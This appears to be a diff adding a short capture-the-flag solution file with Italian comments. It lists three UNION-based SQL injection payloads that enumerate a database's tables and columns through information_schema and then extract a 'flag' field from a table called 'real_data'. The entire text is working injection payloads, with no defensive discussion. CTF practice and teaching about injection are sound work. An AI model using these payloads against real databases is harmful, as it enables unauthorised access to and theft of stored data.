@@ -1,0 +1,8 @@
+-- ottengo i nomi delle tabelle presenti nel database
+query: ' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables #
+
+-- ottengo il nome della colonna della tabella che mi interessa
+query: ' UNION SELECT column_name,2,3,4,5,6 FROM information_schema.columns where table_name like 'real_data' #
+
+-- ottengo il valore del campo che mi interessa nella tabella
+query: ' UNION SELECT flag,2,3,4,5,6 FROM  real_data #
